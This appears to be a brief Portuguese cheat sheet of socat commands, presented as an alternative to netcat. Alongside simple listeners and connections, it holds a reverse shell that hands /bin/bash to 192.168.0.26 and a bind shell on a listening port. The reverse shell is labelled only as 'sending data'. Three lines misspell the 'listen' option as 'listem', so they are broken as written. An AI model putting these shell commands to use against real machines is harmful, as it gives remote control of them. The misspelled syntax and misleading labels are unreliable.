Abrir porta tcp com o socat
	socat tcp4-listem:2222

Abrir porta UDP com o socat
	socat udp4-listem:222

Conectar em um ip e porta especifico
	socat - tcp4:192.168.0.26:4040

Enviar dados pelo socat
	socat tcp4:192.168.0.26:4040 EXEC:/bin/bash

Recebendo dados pelo socat
	socat tcp4-listem:222 EXEC:/bin/bash

É uma outra ferramenta parecida com o nc, é interessante ter o conhecimento de outras ferramentas para caso seja a unica disponivel.


